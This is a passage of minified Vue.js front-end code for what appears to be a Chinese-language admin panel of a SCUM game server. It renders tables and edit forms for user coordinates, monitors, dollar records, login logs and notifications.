")])],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("启用购买限制:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.currentUserLocations.editor.data.configs.purchaseLimitOn,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"purchaseLimitOn",t)},expression:"currentUserLocations.editor.data.configs.purchaseLimitOn"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"-5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制次数:")]),i("a-input-number",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn,min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserLocations.editor.data.configs.time,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"time",t)},expression:"currentUserLocations.editor.data.configs.time"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{allowClear:"",disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn},model:{value:e.currentUserLocations.editor.data.configs.each,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"each",t)},expression:"currentUserLocations.editor.data.configs.each"}},e._l(e.purchaseLimitEachKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t,disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn}},[e._v(" "+e._s(t)+" ")])})),1)],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{loading:e.currentUserLocations.editor.saveLoading,type:"primary"},on:{click:e.submitUserLocations}},[e._v("提交 ")])],1)]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"edit",size:"small",disabled:!0===e.currentUserLocations.editor.show||e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),function(){return e.editUserLocations(n)}.apply(null,arguments)}}},[e._v("编辑 ")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该条用户坐标吗"},on:{confirm:function(){return e.deleteUserLocations(n)}}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",disabled:e.currentUserLocations.editor.show&&e.currentUserLocations.editor.index!==n||e.readOnly}},[e._v(" 删除 ")]):e._e()],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):e._e()]}}],null,!1,3430236106)})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserLocations.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-monitors"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户私人监控设置")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&!1===e.currentUserMonitors.loading&&e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-monitors"===e}))?[i("a-popover",{attrs:{placement:"right",visible:e.currentUserMonitors.editor.show&&-1===e.currentUserMonitors.editor.index,trigger:"click"}},[i("div",{staticStyle:{width:"350px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("新建坐标")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:e.cleanUserMonitorsEditor}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"350px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("坐标: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{placeholder:"坐标是以空格隔开的三个数字"},model:{value:e.currentUserMonitors.editor.data.locations,callback:function(t){e.$set(e.currentUserMonitors.editor.data,"locations",t)},expression:"currentUserMonitors.editor.data.locations"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("描述说明: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},model:{value:e.currentUserMonitors.editor.data.description,callback:function(t){e.$set(e.currentUserMonitors.editor.data,"description",t)},expression:"currentUserMonitors.editor.data.description"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("指定价格:")]),i("a-input-number",{staticStyle:{width:"175px",display:"inline-block","margin-left":"10px"},attrs:{min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserMonitors.editor.data.configs.price,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"price",t)},expression:"currentUserMonitors.editor.data.configs.price"}}),i("a-button",{staticStyle:{"margin-left":"10px"},on:{click:function(t){e.currentUserMonitors.editor.data.configs.price=null}}},[e._v("置空 ")])],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("启用购买限制:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.currentUserMonitors.editor.data.configs.purchaseLimitOn,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"purchaseLimitOn",t)},expression:"currentUserMonitors.editor.data.configs.purchaseLimitOn"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"-5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制次数:")]),i("a-input-number",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn,min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserMonitors.editor.data.configs.time,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"time",t)},expression:"currentUserMonitors.editor.data.configs.time"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{allowClear:"",disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn},model:{value:e.currentUserMonitors.editor.data.configs.each,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"each",t)},expression:"currentUserMonitors.editor.data.configs.each"}},e._l(e.purchaseLimitEachKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t,disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn}},[e._v(" "+e._s(t)+" ")])})),1)],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{loading:e.currentUserMonitors.editor.saveLoading,type:"primary"},on:{click:e.submitUserMonitors}},[e._v("提交 ")])],1)]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"plus",size:"small",disabled:!0===e.currentUserMonitors.editor.show||e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.editNewUserMonitors.apply(null,arguments)}}},[e._v("添加 ")])],1)]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-monitors"===e}))?i("div",{staticStyle:{width:"100%",height:"410px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"840px"},attrs:{columns:e.currentUserMonitors.columns,"data-source":e.currentUserMonitors.userMonitorsList,"row-key":"id",pagination:!1,loading:e.currentUserMonitors.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"locations",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"description",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"price",fn:function(t,a){return[i("span",[e._v(e._s("number"==typeof a.configs.price?a.configs.price+"美金":"-"))])]}},{key:"purchaseLimit",fn:function(t,a){return[!0===a.configs.purchaseLimitOn?i("span",[e._v("每"+e._s(e.eachKeyValues[a.configs.each]||a.configs.each)+"限购"+e._s(a.configs.time)+"次")]):i("span",[e._v("无")])]}},{key:"controls",fn:function(t,a,n){return[i("a-popover",{attrs:{placement:"right",visible:e.currentUserMonitors.editor.show&&e.currentUserMonitors.editor.index===n,trigger:"click"}},[i("div",{staticStyle:{width:"350px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("编辑坐标")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:e.cleanUserMonitorsEditor}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"350px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("坐标: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{placeholder:"坐标是以空格隔开的三个数字"},model:{value:e.currentUserMonitors.editor.data.locations,callback:function(t){e.$set(e.currentUserMonitors.editor.data,"locations",t)},expression:"currentUserMonitors.editor.data.locations"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("描述说明: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},model:{value:e.currentUserMonitors.editor.data.description,callback:function(t){e.$set(e.currentUserMonitors.editor.data,"description",t)},expression:"currentUserMonitors.editor.data.description"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("指定价格:")]),i("a-input-number",{staticStyle:{width:"175px",display:"inline-block","margin-left":"10px"},attrs:{min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserMonitors.editor.data.configs.price,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"price",t)},expression:"currentUserMonitors.editor.data.configs.price"}}),i("a-button",{staticStyle:{"margin-left":"10px"},on:{click:function(t){e.currentUserMonitors.editor.data.configs.price=null}}},[e._v(" 置空 ")])],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("启用购买限制:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.currentUserMonitors.editor.data.configs.purchaseLimitOn,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"purchaseLimitOn",t)},expression:"currentUserMonitors.editor.data.configs.purchaseLimitOn"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"-5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制次数:")]),i("a-input-number",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn,min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserMonitors.editor.data.configs.time,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"time",t)},expression:"currentUserMonitors.editor.data.configs.time"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{allowClear:"",disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn},model:{value:e.currentUserMonitors.editor.data.configs.each,callback:function(t){e.$set(e.currentUserMonitors.editor.data.configs,"each",t)},expression:"currentUserMonitors.editor.data.configs.each"}},e._l(e.purchaseLimitEachKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t,disabled:!e.currentUserMonitors.editor.data.configs.purchaseLimitOn}},[e._v(" "+e._s(t)+" ")])})),1)],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{loading:e.currentUserMonitors.editor.saveLoading,type:"primary"},on:{click:e.submitUserMonitors}},[e._v("提交 ")])],1)]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"edit",size:"small",disabled:!0===e.currentUserMonitors.editor.show||e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),function(){return e.editUserMonitors(n)}.apply(null,arguments)}}},[e._v("编辑 ")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该条用户坐标吗"},on:{confirm:function(){return e.deleteUserMonitors(n)}}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",disabled:e.currentUserMonitors.editor.show&&e.currentUserMonitors.editor.index!==n||e.readOnly}},[e._v(" 删除 ")]):e._e()],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):e._e()]}}],null,!1,58429578)})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserMonitors.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-dollar-change"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户美金流水记录")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-dollar-change"===e}))?[!1===e.currentUserDollarChange.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.clearAndReloadUserDollarChangeList.apply(null,arguments)}}},[e._v("刷新 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-dollar-change"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"600px"},attrs:{scroll:{y:410},columns:e.currentUserDollarChange.columns,"data-source":e.currentUserDollarChange.userDollarChangeList,"row-key":"id",pagination:!1,loading:e.currentUserDollarChange.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"balance",fn:function(t){return[i("span",[e._v(e._s(t.toFixed(2)))])]}},{key:"reason",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss")))])]}}],null,!1,1382944065)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentUserDollarChange.userDollarChangeListPagination.pageSize,current:e.currentUserDollarChange.userDollarChangeListPagination.pageNum,total:e.currentUserDollarChange.userDollarChangeListPagination.total},on:{change:e.onChangeUserDollarChangeListPagination,showSizeChange:e.onShowSizeChangeUserDollarChangeListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserDollarChange.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-login"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户登录记录")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-login"===e}))?[!1===e.currentUserLogin.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.clearAndReloadUserLoginList.apply(null,arguments)}}},[e._v("刷新 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-login"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"950px"},attrs:{scroll:{y:410},columns:e.currentUserLogin.columns,"data-source":e.currentUserLogin.currentUserLoginList,expandedRowKeys:e.currentUserLogin.expandedUserLoginIds,"row-key":"id",pagination:!1,loading:e.currentUserLogin.loading,bordered:"",size:"small"},on:{expand:function(t,i){if(t)void 0===e.currentUserLogin.expandedUserLoginIds.find((function(e){return e===i.id}))&&e.currentUserLogin.expandedUserLoginIds.push(i.id);else{var a=Object.keys(e.currentUserLogin.expandedUserLoginIds).find((function(t){return e.currentUserLogin.expandedUserLoginIds[t]===i.id}));void 0!==a&&e.currentUserLogin.expandedUserLoginIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"loginTimeStamp",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"logoutTimeStamp",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"status",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s("login"===t?"登录":"退出"))])]}},{key:"loginIp",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"sessionId",fn:function(t,a){return[i("span",{style:{color:"login"===a.status?"#52c41a":"black"}},[e._v(e._s(t))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.currentUserLogin.expandedUserLoginIds.find((function(e){return e===t.id}))?[t.otherConfig?[!t.otherConfig||void 0===t.otherConfig.asDrone&&void 0===t.otherConfig.illegalDrone?e._e():[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("管理权限相关信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("登录形态:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(!0===t.otherConfig.asDrone?"无人机":"玩家"))])]),t.otherConfig&&!0===t.otherConfig.illegalDrone?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("违规嫌疑:")]),i("strong",{staticStyle:{color:"#f5222d","margin-left":"10px"}},[e._v("该玩家无服务器管理员身份且尝试以无人机形态登录")])]):e._e()],t.otherConfig&&void 0!==t.otherConfig.loginLocations&&void 0!==t.otherConfig.loginArea?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("登录坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.otherConfig.loginLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.loginArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.otherConfig.loginLocations}})],1)]:e._e()]:e._e()]:e._e()],2)}}],null,!1,14773950)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentUserLogin.userLoginListPagination.pageSize,current:e.currentUserLogin.userLoginListPagination.pageNum,total:e.currentUserLogin.userLoginListPagination.total},on:{change:e.onChangeUserLoginListPagination,showSizeChange:e.onShowSizeChangeUserLoginListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserLogin.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-notification"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户通知列表")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-notification"===e}))?[!1===e.currentUserNotification.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.clearAndReloadUserNotificationList.apply(null,arguments)}}},[e._v("刷新 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-notification"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该用户的所有通知吗"},on:{confirm:function(){return e.cleanUserNotification()}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("清空")])],1)]:e._e(),i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto","margin-top":"10px"}},[i("a-table",{staticStyle:{"max-width":"950px"},attrs:{scroll:{y:410},columns:e.currentUserNotification.columns,"data-source":e.currentUserNotification.currentUserNotificationList,expandedRowKeys:e.currentUserNotification.expandedUserNotificationIds,"row-key":"id",pagination:!1,loading:e.currentUserNotification.loading,bordered:"",size:"small"},on:{expand:function(t,i){if(t)void 0===e.currentUserNotification.expandedUserNotificationIds.find((function(e){return e===i.id}))&&e.currentUserNotification.expandedUserNotificationIds.push(i.id);else{var a=Object.keys(e.currentUserNotification.expandedUserNotificationIds).find((function(t){return e.currentUserNotification.expandedUserNotificationIds[t]===i.id}));void 0!==a&&e.currentUserNotification.expandedUserNotificationIds.splice(a,1)}}},scopedSlots:e._u([{key:"content",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.currentUserNotification.expandedUserNotificationIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.currentUserNotification.expandedUserNotificationIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.currentUserNotification.expandedUserNotificationIds.find((function(e){return e===a.id}))&&e.currentUserNotification.expandedUserNotificationIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"status",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?[e.notificationStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.notificationStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.notificationStatusList[t]?e.notificationStatusList[t]:""))])]:i("a-dropdown",[i("span",{staticStyle:{cursor:"pointer"}},[e.notificationStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.notificationStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.notificationStatusList[t]?e.notificationStatusList[t]:""))]),i("a-icon",{staticStyle:{"margin-left":"3px",transform:"translateY(1px)","font-size":"13px"},attrs:{type:"down"}})],1),i("a-menu",{attrs:{slot:"overlay"},on:{click:function(t){e.updateUserNotification(a.id,t.key)}},slot:"overlay"},e._l(e.notificationStatusList,(function(t,a){return i("a-menu-item",{key:a},[e._v(e._s(t))])})),1)],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.currentUserNotification.expandedUserNotificationIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("sapn",[e._v("暂无可用操作")]):[i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该通知吗"},on:{confirm:function(){return e.deleteUserNotification(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除")])],1)]],2),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("通知内容")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyContent(t.content)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.content.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()],2)}}],null,!1,2980545082)}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.currentUserNotification.userNotificationListPagination.pageSize,current:e.currentUserNotification.userNotificationListPagination.pageNum,total:e.currentUserNotification.userNotificationListPagination.total},on:{change:e.onChangeUserNotificationListPagination,showSizeChange:e.onShowSizeChangeUserNotificationListPagination}})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserNotification.loading}})],2):e._e()],2)],1)}),[],!1,null,"61e74260",null),ce=le.exports,de={name:"User",components:{UserTableExpand:ce},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,showUpdateUserDollarModal:!1,updateUserDollarLoading:!1,showSetUserDollarModal:!1,setUserDollarLoading:!1,updateAllWelcomePacksLoading:!1,updateUserDollarForm:{change:0,reason:""},updateUserDollarRules:{change:[{required:!0,trigger:"change",message:"请输入变动金额，不能为0",validator:function(e,t,i){t&&0!==t&&"number"==typeof t?i():i(new Error("请输入变动金额，不能为0"))}}]},setUserDollarRules:{dollars:[{required:!0,trigger:"change",message:"请输入余额，大于等于0",validator:function(e,t,i){t&&t>=0&&"number"==typeof t?i():i(new Error("请输入余额，大于等于0"))}}]},showSendUserNotificationModal:!1,sendUserNotificationLoading:!1,sendUserNotificationForm:{userIds:[],content:""},sendUserNotificationRules:{userIds:[{required:!0,trigger:"change",message:"请选择推送用户",validator:function(e,t,i){null!=t&&t.length&&void 0===t.find((function(e){return"number"!=typeof e||e<=0}))?i():i(new Error("请选择推送用户"))}}],content:[{required:!0,trigger:"change",message:"请输入推送内容",validator:function(e,t,i){null!=t&&t.length?i():i(new Error("请输入推送内容"))}}]},searchNotificationUserNameList:[],loadingUserListTable:!1,userListFilter:{id:void 0,userName:void 0,email:void 0,phone:void 0,steamId:void 0,level:void 0,status:void 0,isOnline:void 0},userListColumns:[{title:"ID",key:"id",dataIndex:"id",width:200,align:"center",scopedSlots:{customRender:"id"}},{title:"用户昵称",key:"userName",dataIndex:"userName",width:180,align:"center",scopedSlots:{customRender:"userName"}},{title:"在线状态",key:"isOnline",dataIndex:"isOnline",width:80,align:"center",scopedSlots:{customRender:"isOnline"}},{title:"Steam 